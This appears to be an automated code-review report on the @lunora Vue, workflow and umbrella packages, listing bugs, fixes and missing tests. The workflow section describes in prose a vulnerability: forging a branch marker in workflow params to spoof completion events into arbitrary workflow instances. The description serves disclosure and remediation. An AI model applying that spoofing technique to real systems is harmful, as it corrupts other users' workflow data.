The watch source `() => toValue(args)` (lines 197-210) returns a new object on every getter/computed re-evaluation; Vue skips the callback only when Object.is says the value is unchanged, so any reactive-dep change that produces deep-equal args (e.g. `computed(() => ({ ids: [...store.selected] }))` after the source array is replaced with equal content) fires teardownAll(), resets pages to initialPages, and collapses a multi-page loaded feed back to page one. The repo already solves exactly this in this package: use-flag.ts lines 79-80 keys its watch on a stableStringify string with the comment "an equal-but-new context object never churns the subscription". The cost here is much higher than a flag re-subscribe — the user visibly loses their scrolled feed.

**Suggested fix:** Key the watch on `stableStringify(toValue(args))` (shared/stable-key, already imported by use-flag.ts) and re-read the live args inside the callback, matching the use-flag pattern.

#### 3. [MEDIUM / bug] usePresence heartbeats and starts setInterval during SSR, leaking an interval per server render and writing ghost presence rows

`packages/vue/src/use-presence.ts:100`

setup-time code at lines 100-101 unconditionally calls sendHeartbeat() (a client.mutation network write) and setInterval(). The file guards `typeof document` for the visibility listener (lines 109-111) — so SSR was considered — but not the heartbeat or the interval. In a Nuxt universal component (this package ships a /server entry and the repo has @lunora/nuxt), setup runs on the server: every SSR render fires a presence heartbeat with a throwaway makeSessionId() (creating a ghost presence row until TTL), and renderToString never stops the scope, so onScopeDispose (line 130) never fires and each request leaks a live setInterval handle in the Node/workerd process. There is also no getCurrentScope() guard/warning, unlike subscribeToQuery (use-query.ts:46-53) and useConnectionStatus.

**Suggested fix:** Skip the heartbeat/interval/subscription when running server-side (e.g. `typeof window === "undefined"`), and add the getCurrentScope() dev warning used by the other composables.

#### 4. [LOW / bug] loadMore is not re-entrancy safe: two synchronous calls create a degenerate empty page and a duplicate tail

`packages/vue/src/use-paginated-core.ts:244`

loadMore derives status from pageResults.value (line 244), but pageResults is only rebuilt in a pre-flush watcher after pages.value changes (lines 213-223). Two synchronous loadMore calls (a double-click before the next flush) both see the stale tail result → both get status "CanLoadMore" with the SAME nextCursor C → the second applyLoadMore pins the just-appended open tail (C, null] into a degenerate empty range (C, C] and appends a second (C, null] tail. That opens a pointless server subscription over an empty range; it self-heals only via the JOIN pass in rebalance — which the pendingPageKeys leak (finding 1) can permanently disable, making the empty page and its subscription stick forever.

**Suggested fix:** Guard loadMore against re-entrancy per flush — e.g. track the last-applied cursor and no-op when nextCursor equals it, or derive status from the pages list rather than the not-yet-rebuilt pageResults.

#### 5. [LOW / refactor] useSubscription's onError discards the SubscriptionError code

`packages/vue/src/use-subscription.ts:52`

The onError sink rebuilds the error as `new Error(subscriptionError.message)`, dropping SubscriptionError's optional `code` field (packages/client/src/subscription.ts:7-10). Consumers of the exposed `error` ref cannot branch on the error kind (e.g. UNAUTHORIZED vs NOT_FOUND) even though the server supplies it, and the package already depends on @lunora/errors (LunoraError carries a code and is used in lunora-provider.ts).

**Suggested fix:** Surface the code — e.g. construct a LunoraError from code+message, or attach code to the Error — instead of flattening to message-only.

#### 6. [LOW / reuse] buildPageKey uses raw JSON.stringify instead of the repo's shared stableStringify

`packages/vue/src/use-paginated-core.ts:9`

Page/result cache keys are built with `JSON.stringify(pageArgs)` (line 9), which is property-order-sensitive. baseArgs is re-read from `toValue(args)` in three independent places (the args watch, the pages watch, and inside each subscription callback at line 160); a getter that builds the args object with differing key order across invocations (e.g. conditional spreads) produces mismatched keys — rebuildPageResults then fails to find stored results (data blips to undefined) and syncSubscriptions opens duplicate subscriptions. The repo has shared/stable-key.ts's stableStringify for exactly this cache/dedup-key job, and this same package already imports it in use-flag.ts line 5.

**Suggested fix:** Replace JSON.stringify in buildPageKey with stableStringify from ../../../shared/stable-key.

#### Missing test coverage

- usePaginatedCore split/join rebalance: the tests deliberately size pages so thresholds are never crossed (use-paginated-query.test.ts:19-24), leaving rebalance, migrateResultsForRebalance, and the pendingPageKeys suppression gate with zero coverage
- usePaginatedQuery feed reset on reactive args change (teardownAll + return to LoadingFirstPage) and the skip→real-args transition — only static args and static 'skip' are tested
- loadMore tail re-key path: no assertion that the pinned tail's existing subscription survives loadMore (is neither unsubscribed nor reopened) and that its result migrates to the new key
- useFlags with a reactive context: resubscription of every flag, reset to defaults on context change, and teardown of all per-key subscriptions on scope stop (only the single static-flags happy path is tested)
- useSubscription error path: nothing drives the subscription's onError callback to assert the error ref populates and data clears
- usePresence setData (immediate heartbeat carrying the new data blob) and the visibilitychange re-focus heartbeat are untested
- Auth gate components (Authenticated / Unauthenticated / AuthLoading in auth-gates.ts) have no test file at all — the token/user gating matrix is unverified
- shardKey forwarding from usePaginatedQuery/useInfiniteQuery options into each per-page client.subscribe call is never asserted

<a id="lunoraworkflow"></a>

### @lunora/workflow

**Assessment:** Well-factored package: the Node-safe/workerd split is clean, error-conversion boundaries are carefully reasoned, and unit coverage of the Node-safe modules is solid. The risk is concentrated in the fan-out/group-saga orchestration (fan-out.ts + do/index.ts): the in-band branch marker is trusted from workflow params, compensation is skipped on join timeout, the child's error-signal path can mask the real failure, and the workerd base class has zero tests.

#### 1. [HIGH / security] Branch marker is trusted from workflow params — forged __lunoraBranch enables event spoofing into arbitrary workflow instances via arbitrary env-binding lookup — _unverified (verifier hit session limit)_

`packages/workflow/src/fan-out.ts:328`

The parent injects the join callback marker in-band into the child's params (fan-out.ts:213), and the child extracts it from event.payload with only shape validation (extractBranchMarker, fan-out.ts:279-302). signalBranchParent then does `deps.env[marker.parentBinding]` (line 328) — an attacker-controlled binding name — and calls `.get(marker.parentId).sendEvent({ payload: outcome, type: marker.eventType })`. Workflow params routinely flow from client input (a mutation forwarding client args into `ctx.workflows.get(x).create({ params })`). A malicious client who embeds a well-formed `__lunoraBranch` object can make any workflow instance, on completion, deliver a branch-completion event to any Workflow binding and any instance id. Child ids are derivable (`${parentId}-c${N}`, run-context.ts:65) and event types are `lunora:branch:<childId>`, so a victim parent's `ctx.parallel` join slot can be resolved with an attacker-influenced payload (spawn a workflow that echoes params → inject a forged 'ok' value, or a forged 'error' that triggers the victim group's compensation workflows with attacker-chosen error text). This corrupts the victim workflow's data flow (e.g. a 'payment cleared' branch result).

**Suggested fix:** Make the marker unforgeable: generate a random nonce inside the parent's spawn step.do (durable across replays), include it in the marker and require the awaited event type to embed it — or move the marker out of the user-visible params namespace and reject any create whose params already contain BRANCH_MARKER_KEY. At minimum, validate marker.parentBinding starts with WORKFLOW_ and marker.eventType starts with BRANCH_EVENT_PREFIX before dereferencing env.

#### 2. [MEDIUM / bug] Group-saga compensation is skipped when a branch join times out

`packages/workflow/src/fan-out.ts:228`

createParallel only runs compensateCompleted when a branch reports `status === "error"` (lines 234-240). If `step.waitForEvent` itself throws — the per-branch `timeout` elapsing (line 229), which is exactly what happens when a child crashes before its base class can signal, or when signalBranchParent no-ops because the parent binding is absent (the documented fallback at fan-out.ts:319-321) — the throw propagates out of the loop and `compensateCompleted` never runs. Already-completed siblings that declared `compensateWith` are left un-compensated, violating the documented guarantee ('when a branch fails, every already-completed sibling ... is rolled back', lines 177-182). Failure scenario: branch A completes (charged a customer), branch B's child instance is terminated by an operator → parent's waitForEvent times out → group fails with the raw timeout error and A's compensation workflow is never spawned.

**Suggested fix:** Wrap the waitForEvent call in try/catch and run compensateCompleted with a serialized timeout error before rethrowing (as a NonRetryableError for consistency with the reported-error path).

#### 3. [MEDIUM / bug] Failure of the error-path parent signal masks the handler's original error and skips NonRetryableError conversion

`packages/workflow/src/do/index.ts:79`

In LunoraWorkflow.run's catch block, `await signalBranchParent(...)` (line 79) runs before `convertNonRetryableError(error, ...)` (line 86). signalBranchParent is only 'best-effort' for a missing binding (fan-out.ts:330-332); if `binding.get(parentId)` or `parent.sendEvent` rejects persistently, the inner `step.do` (fan-out.ts:336) exhausts its retries and throws — replacing the handler's real error as the instance's recorded failure, and bypassing the portable→native NonRetryableError conversion the comment on lines 82-86 promises. Failure scenario: a branch child throws a domain error while the parent instance has already been terminated → child's `getParent`/`sendEvent` fails → the instance errors with a workflow-RPC error instead of the domain error, making the Studio/REST error timeline misleading. The same unguarded await exists on the success path (line 92), where a signal failure marks a successfully-completed child instance as errored.

**Suggested fix:** Wrap both signalBranchParent calls in try/catch (log the signal failure); on the error path always fall through to convertNonRetryableError(error, ...) with the original error.

#### 4. [MEDIUM / bug] Duplicate branch ids in one ctx.parallel group are not rejected — second branch silently never runs

`packages/workflow/src/fan-out.ts:199`

nextChildId returns an explicit id verbatim (run-context.ts:60-63) and createParallel does no uniqueness check over the planned ids (lines 199-203). Two branches passing the same `id` (e.g. `branch("a", p, { id: "x" })` and `branch("b", q, { id: "x" })`) produce identical spawn step names (`lunora:spawn:x`), so step.do memoization means the second child is never created, and both joins wait on the same step name/event type (`lunora:await:x` / `lunora:branch:x`). The group either returns a duplicated first-branch result in the second slot or hangs until the waitForEvent timeout — silent wrong output rather than a loud error. An explicit id colliding with a derived `${parentId}-c${N}` id has the same effect.

**Suggested fix:** Build a Set of planned childIds before spawning and throw a NonRetryableError on a duplicate (also guards an explicit id colliding with a derived one).

#### 5. [LOW / bug] A missing compensateWith binding aborts remaining group compensations and burns step retries on a deterministic error

`packages/workflow/src/fan-out.ts:162`

Inside compensateCompleted, `deps.resolveBinding(compensateWith)` (line 162) runs inside the compensation step.do. If the compensateWith export name is typo'd or its WORKFLOW_* binding is absent, resolveBinding throws a deterministic LunoraError (run-context.ts:46-51) that Cloudflare retries per the default step config before failing the step; the loop then aborts, so compensations for earlier-declared completed siblings never spawn, and the parent's terminal error becomes the binding error instead of the group-failure NonRetryableError thrown at line 239 — the original branch failure is masked.

**Suggested fix:** Resolve every compensateWith binding up front (before the loop) and fail fast with a NonRetryableError naming the bad export — or catch per-compensation errors, log them, and continue the reverse loop so one bad compensation doesn't strand the others.

#### Missing test coverage

- src/do/index.ts (LunoraWorkflow.run) has zero tests: marker extraction + payload stripping into the handler event, signal-on-success vs signal-on-error ordering, and native NonRetryableError conversion at the run boundary are all unexercised (testable by aliasing/mocking cloudflare:workers in vitest).
- ctx.parallel branch timeout: no test that branch(..., { timeout }) is forwarded to step.waitForEvent, and no test of behavior when waitForEvent rejects (the path where group compensation is currently skipped).
- compensateCompleted with a missing/unresolvable compensateWith binding — the abort-and-mask behavior is untested.
- Duplicate explicit branch ids within one ctx.parallel group (memoized spawn + colliding await names) — untested.
- signalBranchParent when the parent binding exists but sendEvent/get rejects — only the missing-binding no-op is tested (fan-out.test.ts:259).
- createWorkflowsRestClient.listInstances status-filter query param (`status`) is never asserted — only page/per_page forwarding is tested (rest-api.test.ts:100).

<a id="lunorash"></a>

### lunorash

**Assessment:** The package is in excellent health: it is a pure re-export umbrella (~20 one-line barrel files plus a 19-line CLI bin wrapper) with no logic to get wrong, and I verified every exports-map subpath resolves to a real src barrel and a real upstream export, including the only non-trivial remappings (lunorash/flags/* to @lunora/flags/providers/*) and the codegen-emitted specifiers. The only real weaknesses are that the re-export smoke test has drifted behind the export map (the errors, ratelimit, and all five flags subpaths are exported but never tested) and the bin wrapper duplicates @lunora/cli's bin verbatim; README/docs also omit the newer errors/flags/ratelimit subpaths.

#### 1. [LOW / reuse] bin.ts is a byte-for-byte duplicate of @lunora/cli's bin wrapper

`packages/lunora/src/bin.ts:10`

The try/await runCli()/process.exit(code)/catch-write-stderr-exit(1) block in packages/lunora/src/bin.ts:10-19 is identical to packages/cli/src/bin.ts:8-17. If the CLI's top-level error handling ever changes (e.g. rendering LunoraError hints via renderLunoraError instead of the bare message), the two bins will silently diverge and `lunora` installed via the umbrella will behave differently from `@lunora/cli`'s bin.

**Suggested fix:** Have @lunora/cli export its bin entry (e.g. an `./bin` exports subpath or an exported `main()` that wraps runCli + exit handling) and reduce packages/lunora/src/bin.ts to a one-line import, so the exit/error policy has a single source of truth.

#### Missing test coverage

- packages/lunora/**tests**/re-exports.test.ts covers only 14 of the 21 exported entry points: lunorash/flags, lunorash/flags/env, lunorash/flags/flagship, lunorash/flags/memory, and lunorash/flags/web are untested — and these are the only subpaths whose upstream specifier is NOT the namesake (flags/flagship maps to @lunora/flags/providers/flagship), i.e. exactly the typo class the test exists to catch.
- lunorash/errors and lunorash/ratelimit re-export forwarding is untested — a dropped or misspelled `export *` in src/errors.ts or src/ratelimit.ts would ship unnoticed.
- The `lunora` bin (src/bin.ts) has no test for exit-code propagation: neither that a runCli()-returned non-zero code becomes the process exit code, nor that a thrown startup error writes the message to stderr and exits 1.
